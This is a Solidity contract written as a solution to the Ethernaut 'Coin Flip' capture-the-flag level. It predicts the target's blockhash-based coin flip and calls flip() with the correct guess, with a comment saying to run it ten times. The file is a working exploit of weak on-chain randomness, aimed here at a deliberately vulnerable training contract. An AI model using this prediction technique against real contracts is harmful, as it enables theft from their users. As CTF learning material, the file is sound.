// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 03: Coin Flip
// https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f

import "../helpers/SafeMath-08.sol";

contract CoinFlip_Hack {
  address coinflipInstance;
  using SafeMath for uint256;
  uint256 lastHash;
  
  constructor(address _coinflipInstance) {
    coinflipInstance = _coinflipInstance;
  }

  /// @notice Call this function 10 times to complete the challenge
  function runFlip() public {
    ICoinFlip c = ICoinFlip(coinflipInstance);
    c.flip(getFlip());
  }

  /// @notice The following logic copied from the CoinFlip contract
  function getFlip() public returns (bool) { 

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    return side;
  }
}

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}